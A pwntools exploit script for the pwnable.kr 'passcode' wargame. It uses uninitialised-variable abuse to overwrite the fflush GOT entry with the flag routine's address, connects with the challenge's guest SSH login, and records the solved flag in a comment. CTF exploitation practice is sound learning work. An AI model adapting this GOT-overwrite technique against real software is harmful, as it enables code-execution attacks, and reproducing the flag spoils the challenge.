#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './passcode')

host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'passcode'
password = args.PASSWORD or 'guest'

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    ssh_client = ssh(user, host, port=port, password=password, timeout=10)
    io = ssh_client.process('./passcode', tty=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
def main():
    io = start()
    
    # Fill passcode1 var with garbage data of 0x804c014 - address of fflush GOT Entry.
    io.sendline(cyclic(0x60) + p32(0x804c014))

    # Overwrite fflush GOT Entry with address of get flag routine.
    io.sendline(str(0x0804929e))

    io.interactive()

if __name__ == "__main__":
    main()

#flag: s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
